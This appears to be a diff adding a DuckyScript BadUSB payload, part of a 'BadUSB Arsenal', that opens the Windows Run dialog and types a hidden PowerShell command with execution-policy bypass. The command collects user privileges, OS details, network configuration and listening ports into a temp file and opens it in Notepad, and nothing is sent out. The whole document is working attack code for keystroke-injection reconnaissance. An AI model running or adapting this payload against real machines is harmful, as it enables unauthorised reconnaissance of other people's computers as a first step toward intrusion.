@@ -1,0 +1,7 @@
+REM Windows Fast In-Memory Reconnaissance
+REM Hard-Tools BadUSB Arsenal
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$r = @(); $r += '=== SYSTEM & USER ==='; $r += (whoami /all); $r += '=== OS INFO ==='; $r += (Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture); $r += '=== NETWORK ADAPTERS ==='; $r += (ipconfig /all); $r += '=== ACTIVE ROUTES & PORTS ==='; $r += (Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess); $r | Out-File -FilePath \"$env:TEMP\win_recon.txt\" -Encoding utf8; Start-Process notepad.exe \"$env:TEMP\win_recon.txt\""
+ENTER
